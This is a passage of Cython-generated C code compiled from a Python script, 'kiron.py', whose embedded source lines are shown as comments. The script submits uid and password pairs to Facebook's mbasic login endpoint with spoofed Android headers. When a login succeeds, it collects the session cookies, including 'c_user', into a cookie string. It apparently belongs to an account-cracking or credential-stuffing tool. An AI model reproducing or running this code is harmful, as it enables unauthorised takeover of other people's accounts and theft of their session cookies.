          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_group); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 412, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_6, __pyx_int_1};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 412, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_m_ts, __pyx_t_2) < 0) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

        /* "kiron.py":413
 *             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
 *             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 *             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),             # <<<<<<<<<<<<<<
 *             "try_number":"0",
 *             "unrecognized_tries":"0",
 */
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_re); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_search); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = __Pyx_PyObject_Str(__pyx_v_free_fb); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_15 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (unlikely(PyMethod_Check(__pyx_t_14))) {
          __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_14);
          if (likely(__pyx_t_15)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
            __Pyx_INCREF(__pyx_t_15);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_14, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_15, __pyx_kp_s_name_li_value, __pyx_t_6};
          __pyx_t_7 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_9, 2+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 413, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        }
        __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_group); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_t_7 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_14))) {
          __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_14);
          if (likely(__pyx_t_7)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
            __Pyx_INCREF(__pyx_t_7);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_14, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_7, __pyx_int_1};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 413, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        }
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_li, __pyx_t_2) < 0) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_try_number, __pyx_kp_s_0_2) < 0) __PYX_ERR(0, 410, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_unrecognized_tries, __pyx_kp_s_0_2) < 0) __PYX_ERR(0, 410, __pyx_L3_error)

        /* "kiron.py":416
 *             "try_number":"0",
 *             "unrecognized_tries":"0",
 *             "email":uid,             # <<<<<<<<<<<<<<
 *             "pass":ps,
 *             "login":"Log In"}
 */
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_email, __pyx_v_uid) < 0) __PYX_ERR(0, 410, __pyx_L3_error)

        /* "kiron.py":417
 *             "unrecognized_tries":"0",
 *             "email":uid,
 *             "pass":ps,             # <<<<<<<<<<<<<<
 *             "login":"Log In"}
 *                     head = {
 */
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_pass, __pyx_v_ps) < 0) __PYX_ERR(0, 410, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_login, __pyx_kp_s_Log_In) < 0) __PYX_ERR(0, 410, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_data, ((PyObject*)__pyx_t_3));
        __pyx_t_3 = 0;

        /* "kiron.py":420
 *             "login":"Log In"}
 *                     head = {
 *     'authority': 'mbasic.facebook.com',             # <<<<<<<<<<<<<<
 *     'method': 'GET',
 *     'scheme': 'https',
 */
        __pyx_t_3 = __Pyx_PyDict_NewPresized(19); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 420, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_authority, __pyx_kp_s_mbasic_facebook_com) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_method, __pyx_n_s_GET) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_scheme, __pyx_n_s_https) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_accept, __pyx_kp_s_text_html_application_xhtml_xml) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_accept_language, __pyx_kp_s_en_BD_en_GB_q_0_9_en_US_q_0_8_en) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_cache_control, __pyx_kp_s_max_age_0) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_n_s_dpr, __pyx_kp_s_3) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_prefers_color_scheme, __pyx_n_s_light) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_ua, __pyx_kp_s_Not_A_Brand_v_8_Chromium_v_120) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_ua_full_version_list, __pyx_kp_s_Not_A_Brand_v_8_0_0_0_Chromium) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_ua_mobile, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_ch_ua_platform, __pyx_kp_s_Android) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_dest, __pyx_n_s_document) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_mode, __pyx_n_s_navigate) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_site, __pyx_n_s_none) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_sec_fetch_user, __pyx_kp_s_1_2) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_upgrade_insecure_requests, __pyx_kp_s_1) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_viewport_width, __pyx_kp_s_980) < 0) __PYX_ERR(0, 420, __pyx_L3_error)

        /* "kiron.py":438
 *     'upgrade-insecure-requests': '1',
 *     'viewport-width': '980',
 *     'user-agent': us}             # <<<<<<<<<<<<<<
 *                     po = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc', data=data, headers=head,allow_redirects=False,verify=True).text
 *                     log_cookies=session.cookies.get_dict().keys()
 */
        if (PyDict_SetItem(__pyx_t_3, __pyx_kp_s_user_agent, __pyx_v_us) < 0) __PYX_ERR(0, 420, __pyx_L3_error)
        __Pyx_XDECREF_SET(__pyx_v_head, ((PyObject*)__pyx_t_3));
        __pyx_t_3 = 0;

        /* "kiron.py":439
 *     'viewport-width': '980',
 *     'user-agent': us}
 *                     po = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc', data=data, headers=head,allow_redirects=False,verify=True).text             # <<<<<<<<<<<<<<
 *                     log_cookies=session.cookies.get_dict().keys()
 *                     if 'c_user' in log_cookies:
 */
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_session, __pyx_n_s_post); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 439, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_2 = __Pyx_PyDict_NewPresized(4); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 439, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_data, __pyx_v_data) < 0) __PYX_ERR(0, 439, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_headers, __pyx_v_head) < 0) __PYX_ERR(0, 439, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_allow_redirects, Py_False) < 0) __PYX_ERR(0, 439, __pyx_L3_error)
        if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_verify, Py_True) < 0) __PYX_ERR(0, 439, __pyx_L3_error)
        __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_tuple__70, __pyx_t_2); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 439, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_14);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_text); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 439, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        __Pyx_XDECREF_SET(__pyx_v_po, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "kiron.py":440
 *     'user-agent': us}
 *                     po = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc', data=data, headers=head,allow_redirects=False,verify=True).text
 *                     log_cookies=session.cookies.get_dict().keys()             # <<<<<<<<<<<<<<
 *                     if 'c_user' in log_cookies:
 *                            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"XD={ssbb};{coki}"
 */
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_session, __pyx_n_s_cookies); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 440, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 440, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __pyx_t_3 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
          __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+1-__pyx_t_9, 0+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 440, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_14, __pyx_n_s_keys); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 440, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
        __pyx_t_14 = NULL;
        __pyx_t_9 = 0;
        #if CYTHON_UNPACK_METHODS
        if (likely(PyMethod_Check(__pyx_t_7))) {
          __pyx_t_14 = PyMethod_GET_SELF(__pyx_t_7);
          if (likely(__pyx_t_14)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_14);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
            __pyx_t_9 = 1;
          }
        }
        #endif
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_14, NULL};
          __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_7, __pyx_callargs+1-__pyx_t_9, 0+__pyx_t_9);
          __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 440, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_log_cookies, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "kiron.py":441
 *                     po = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc', data=data, headers=head,allow_redirects=False,verify=True).text
 *                     log_cookies=session.cookies.get_dict().keys()
 *                     if 'c_user' in log_cookies:             # <<<<<<<<<<<<<<
 *                            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"XD={ssbb};{coki}"
 *                            uidx=re.findall("c_user=(.*);xs", coki)[0]
 */
        __pyx_t_16 = (__Pyx_PySequence_ContainsTF(__pyx_n_s_c_user, __pyx_v_log_cookies, Py_EQ)); if (unlikely((__pyx_t_16 < 0))) __PYX_ERR(0, 441, __pyx_L3_error)
        if (__pyx_t_16) {

          /* "kiron.py":442
 *                     log_cookies=session.cookies.get_dict().keys()
 *                     if 'c_user' in log_cookies:
 *                            coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookies = f"XD={ssbb};{coki}"             # <<<<<<<<<<<<<<
 *                            uidx=re.findall("c_user=(.*);xs", coki)[0]
 *                            uid=str(uidx)
 */
          { /* enter inner scope */
            __pyx_t_2 = PyList_New(0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 442, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_2);
            __pyx_t_8 = 0;
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_session, __pyx_n_s_cookies); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 442, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_get_dict); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 442, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __pyx_t_3 = NULL;
            __pyx_t_18 = 0;
            #if CYTHON_UNPACK_METHODS
            if (likely(PyMethod_Check(__pyx_t_6))) {
              __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_6);
              if (likely(__pyx_t_3)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
                __Pyx_INCREF(__pyx_t_3);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_6, function);
                __pyx_t_18 = 1;
              }
            }
            #endif
            {
              PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
              __pyx_t_14 = __Pyx_PyObject_FastCall(__pyx_t_6, __pyx_callargs+1-__pyx_t_18, 0+__pyx_t_18);
              __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
              if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L14_error)
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            if (unlikely(__pyx_t_14 == Py_None)) {
              PyErr_Format(PyExc_AttributeError, "'NoneType' object has no attribute '%.30s'", "items");
              __PYX_ERR(0, 442, __pyx_L14_error)
            }
            __pyx_t_6 = __Pyx_dict_iterator(__pyx_t_14, 0, __pyx_n_s_items, (&__pyx_t_17), (&__pyx_t_9)); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 442, __pyx_L14_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
            __Pyx_XDECREF(__pyx_t_7);
            __pyx_t_7 = __pyx_t_6;
            __pyx_t_6 = 0;
            while (1) {
              __pyx_t_18 = __Pyx_dict_iter_next(__pyx_t_7, __pyx_t_17, &__pyx_t_8, &__pyx_t_6, &__pyx_t_14, NULL, __pyx_t_9);
              if (unlikely(__pyx_t_18 == 0)) break;
              if (unlikely(__pyx_t_18 == -1)) __PYX_ERR(0, 442, __pyx_L14_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_GOTREF(__pyx_t_14);
              __Pyx_XDECREF_SET(__pyx_8genexpr1__pyx_v_key, __pyx_t_6);
              __pyx_t_6 = 0;
              __Pyx_XDECREF_SET(__pyx_8genexpr1__pyx_v_value, __pyx_t_14);
              __pyx_t_14 = 0;
              __pyx_t_14 = PyNumber_Add(__pyx_8genexpr1__pyx_v_key, __pyx_kp_s__72); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L14_error)
              __Pyx_GOTREF(__pyx_t_14);
              __pyx_t_6 = PyNumber_Add(__pyx_t_14, __pyx_8genexpr1__pyx_v_value); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 442, __pyx_L14_error)
              __Pyx_GOTREF(__pyx_t_6);
              __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
              if (unlikely(__Pyx_ListComp_Append(__pyx_t_2, (PyObject*)__pyx_t_6))) __PYX_ERR(0, 442, __pyx_L14_error)
              __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_key); __pyx_8genexpr1__pyx_v_key = 0;
            __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_value); __pyx_8genexpr1__pyx_v_value = 0;
            goto __pyx_L17_exit_scope;
            __pyx_L14_error:;
            __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_key); __pyx_8genexpr1__pyx_v_key = 0;
            __Pyx_XDECREF(__pyx_8genexpr1__pyx_v_value); __pyx_8genexpr1__pyx_v_value = 0;
            goto __pyx_L3_error;
            __pyx_L17_exit_scope:;
          } /* exit inner scope */
          __pyx_t_7 = __Pyx_PyString_Join(__pyx_kp_s__71, __pyx_t_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_v_coki = ((PyObject*)__pyx_t_7);
          __pyx_t_7 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_base64); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_b64encode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_os); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_15 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_urandom); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __pyx_t_3 = NULL;
          __pyx_t_9 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_15))) {
            __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_15);
            if (likely(__pyx_t_3)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_15);
              __Pyx_INCREF(__pyx_t_3);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_15, function);
              __pyx_t_9 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_int_18};
            __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_15, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
            if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 442, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_6);
            __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          }
          __pyx_t_15 = NULL;
          __pyx_t_9 = 0;
          #if CYTHON_UNPACK_METHODS
          if (unlikely(PyMethod_Check(__pyx_t_14))) {
            __pyx_t_15 = PyMethod_GET_SELF(__pyx_t_14);
            if (likely(__pyx_t_15)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
              __Pyx_INCREF(__pyx_t_15);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_14, function);
              __pyx_t_9 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_15, __pyx_t_6};
            __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_9, 1+__pyx_t_9);
            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 442, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_decode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
          __pyx_t_2 = NULL;
          __pyx_t_9 = 0;
          #if CYTHON_UNPACK_METHODS
          if (likely(PyMethod_Check(__pyx_t_14))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_14);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_14);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_14, function);
              __pyx_t_9 = 1;
            }
          }
          #endif
          {
            PyObject *__pyx_callargs[2] = {__pyx_t_2, NULL};
            __pyx_t_7 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+1-__pyx_t_9, 0+__pyx_t_9);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 442, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          }
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_replace); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_tuple__73, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_replace); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_tuple__76, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_t_14 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_replace); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_14, __pyx_tuple__78, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          __pyx_v_ssbb = __pyx_t_7;
          __pyx_t_7 = 0;
          __pyx_t_7 = PyTuple_New(4); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_7);
          __pyx_t_17 = 0;
          __pyx_t_5 = 127;
          __Pyx_INCREF(__pyx_kp_u_XD_3);
          __pyx_t_17 += 3;
          __Pyx_GIVEREF(__pyx_kp_u_XD_3);
          PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_kp_u_XD_3);
          __pyx_t_14 = __Pyx_PyObject_FormatSimple(__pyx_v_ssbb, __pyx_empty_unicode); if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 442, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_5 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) > __pyx_t_5) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_14) : __pyx_t_5;
          __pyx_t_17 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_14);
          __Pyx_GIVEREF(__pyx_t_14);
          PyTuple_SET_ITEM(__pyx_t_7, 1, __pyx_t_14);
          __pyx_t_14 = 0;
          __Pyx_INCREF(__pyx_kp_u__71);
          __pyx_t_17 += 1;
          __Pyx_GIVEREF(__pyx_kp_u__71);
